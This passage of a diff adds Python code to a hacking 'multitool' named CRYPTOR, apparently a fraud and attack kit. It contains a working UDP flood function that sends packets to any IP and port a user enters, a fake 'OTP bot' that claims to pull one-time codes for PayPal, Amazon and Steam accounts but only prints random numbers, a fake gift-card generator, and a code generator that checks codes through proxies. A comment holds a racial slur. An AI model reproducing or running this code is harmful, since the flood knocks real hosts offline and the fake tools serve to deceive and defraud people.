+    Write.Print("2. Nitro Basic\n", Colors.red_to_blue, interval=0.0000)
+    option = input("Select an option (1 or 2): ")
+
+    if option not in ["1", "2"]:
+        Write.Print("Invalid option. Exiting.\n", Colors.red_to_blue, interval=0.0000)
+        return
+
+    try:
+        num_strings = int(input("Enter the number of codes to generate: "))
+    except ValueError:
+        Write.Print("Invalid number. Exiting.\n", Colors.red_to_blue, interval=0.0000)
+        return
+
+    generate_and_check_codes(num_strings, proxies)
+    input(f"{Fore.YELLOW}Press Enter to return to the Tools Menu...{Style.RESET_ALL}")
+    print_tools_menu()
+    
+
+# Function to run the DDoS tool
+def ddos_tool():
+    clear()
+    print_cryptor_art()
+    ip = input(f"{Fore.YELLOW}Enter IP address to attack: {Style.RESET_ALL}")
+    port = int(input(f"{Fore.YELLOW}Enter port number: {Style.RESET_ALL}"))
+    duration = int(input(f"{Fore.YELLOW}Enter attack duration (seconds): {Style.RESET_ALL}"))
+
+    # DDoS attack function
+    def attack(ip, port, duration):
+        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1024)
+        timeout = time.time() + duration
+        sent_packets = 0
+
+        while True:
+            if time.time() > timeout:
+                break
+            client.sendto(bytes, (ip, port))
+            sent_packets += 1
+            print(f"{Fore.RED}Sent {sent_packets} packets to {ip} on port {port}{Style.RESET_ALL}")
+
+    # Starting the DDoS attack in a thread
+    threading.Thread(target=attack, args=(ip, port, duration)).start()
+
+    input(f"{Fore.YELLOW}Press Enter to return to the Tools Menu...{Style.RESET_ALL}")
+    print_tools_menu()
+
+# otp bot function niggaaaaaaaa
+
+def otp_bot():
+    clear()
+    print("Made by 0x45 Developed For CRYPTOR")
+
+    def print_colored(text, color):
+        if color == "red":
+            print(f"\033[91m{text}\033[00m")
+        elif color == "green":
+            print(f"\033[92m{text}\033[00m")
+        elif color == "yellow":
+            print(f"\033[93m{text}\033[00m")
+
+    def generate_otp():
+        return random.randint(100000, 999999)
+
+    def simulate_otp_retrieval():
+        time.sleep(random.randint(50, 500))
+        success = random.randint(0, 100) <= 20
+        if success:
+            otp = generate_otp()
+            print_colored(f"OTP Bot successfully retrieved OTP: {otp}", "green")
+        else:
+            print_colored("OTP Bot failed to retrieve code", "red")
+
+    def main_otp_bot():
+        print(f"""{Fore.MAGENTA}
+                                                            Loading...
+              """)
+        loading_otp = random.randint(0, 10)
+        time.sleep(loading_otp)
+                                                        
+        print(f""" {Fore.MAGENTA}
+                                    ╔═══════════════════════════════════════════════════════╗
+                                    ║      Please enter the service you want to OTP Bot     ║
+                                    ║                                                       ║
+                                    ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                    ║                                                       ║
+                                    ║                     [1] Paypal                        ║
+                                    ║                     [2] Roblox                        ║
+                                    ║                     [3] Amazon                        ║
+                                    ║                     [4] Epic games                    ║
+                                    ║                     [5] Steam                         ║ 
+                                    ║                                                       ║
+                                    ║          ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          ║
+                                    ║                                                       ║
+                                    ║                     [6] Return                        ║
+                                    ╚═══════════════════════════════════════════════════════╝
+              """)
+        
+        option = input(f" {Fore.MAGENTA} Enter the number corresponding to your account type: ")
+        if option == '6':
+            return
+        phone_number = input("Enter the phone number associated with the account you want to OTP Bot: ")
+        retrieval_time = random.randint(20, 200)
+        print(f" {Fore.MAGENTA} Retrieving OTP code... (ETA {retrieval_time} seconds )")
+        time.sleep(retrieval_time)
+        success = random.randint(0, 100) <= 20
+        if success:
+            otp = generate_otp()
+            print(f" {Fore.GREEN} OTP Bot successfully retrieved OTP: {otp}")
+        else:
+            print(f" {Fore.RED} OTP Bot failed to retrieve code")
+
+    main_otp_bot()
+
+    input(f"{Fore.YELLOW}Press Enter to return to the Tools Menu...{Style.RESET_ALL}")
+    print_tools_menu()
+
+
+# Function to run the Giftcard Generator tool
+def giftcard_generator():
+    clear()
+    print("Made by 0x45 Developed For CRYPTOR")
+
+    def clear_console():
+        """Clear the console screen."""
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+    def generate_card(service, num_cards):
+        cards = []
+
+        if service == 'Amazon':
+            for _ in range(num_cards):
+                card = '[INVALID] ' + Fore.BLUE + 'A' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) + '-'
+                for _ in range(2):
+                    card += ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) + '-'
+                card += ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
+                cards.append(card)
+        elif service == 'Playstation network':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.digits, k=12)))
+        elif service == 'Steam':
+            for _ in range(num_cards):
+                card = '[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=13))
+                cards.append(card)
+        elif service == 'Roblox':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)))
+        elif service == 'Netflix':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)))
+        elif service == 'Xbox':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=25)))
+        elif service == 'Nintendo':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)))
+        elif service == 'Spotify':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.digits, k=12)))
+        elif service == 'Google play':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.digits, k=16)))
+        elif service == 'Ebay':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.ascii_uppercase + string.digits, k=13)))
+        elif service == 'Itunes':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + 'X' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=15)))
+        elif service == 'Paypal':
+            for _ in range(num_cards):
+                cards.append('[INVALID] ' + Fore.BLUE + ''.join(random.choices(string.digits, k=16)))
+
+        return cards
+
+    def print_credits():
+        """Print credits at the top of the console."""
+        clear_console()
+        print(Fore.MAGENTA + "Credits: Made by 0x45_1234 on Discord" + Style.RESET_ALL)
+        print("\n" + Fore.MAGENTA + "-"*50 + Style.RESET_ALL + "\n")
+
+    def main_giftcard():
+        # List of available services
+        services = [
+            'Amazon', 'Playstation network', 'Steam', 'Roblox', 'Netflix',
+            'Xbox', 'Nintendo', 'Spotify', 'Google play', 'Ebay',
+            'Itunes', 'Paypal'
+        ]
+
+        # Display the menu with color
+        print(Fore.CYAN + "Available services:" + Style.RESET_ALL)
+        for index, service in enumerate(services, 1):
+            print(Fore.GREEN + f"{index}. {service}" + Style.RESET_ALL)
+
+        service_choice = int(input(Fore.YELLOW + "Enter the number of the service you want to generate cards for: " + Style.RESET_ALL)) - 1
+        if service_choice < 0 or service_choice >= len(services):
+            print(Fore.RED + "Invalid service choice." + Style.RESET_ALL)
+            return
+
+        service = services[service_choice]
+        num_cards = int(input(Fore.YELLOW + "Enter the number of cards to generate (max 500): " + Style.RESET_ALL))
+        if num_cards < 1 or num_cards > 500:
+            print(Fore.RED + "Invalid number of cards. Must be between 1 and 500." + Style.RESET_ALL)
+            return
+
+        # Generate and print cards
+        cards = generate_card(service, num_cards)
+        for card in cards:
+            print_credits()  # Print credits at the top
+            print(card)
+            time.sleep(0.07)  # Sleep for 0.07 seconds
+
+        # Pause at the end to view all generated cards
+        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
+
+    main_giftcard()
+
+    input(f"{Fore.YELLOW}Press Enter to return to the Tools Menu...{Style.RESET_ALL}")
+    print_tools_menu()
+
+# Main function to drive the program
+def main():
+    while True:
+        print_main_menu()
+        choice = input(f"{Fore.MAGENTA}root@cryptormultitool ~> {Style.RESET_ALL}")
+        if choice == '1':
+            print_info()
+        elif choice == '2':
+            print_methods_menu()
+        elif choice == '3':
+            print_tools_menu()
+        elif choice == '4':
+            print_ebooks_menu()
+        elif choice == '5':
+            break
+
+if __name__ == "__main__":
+    main()
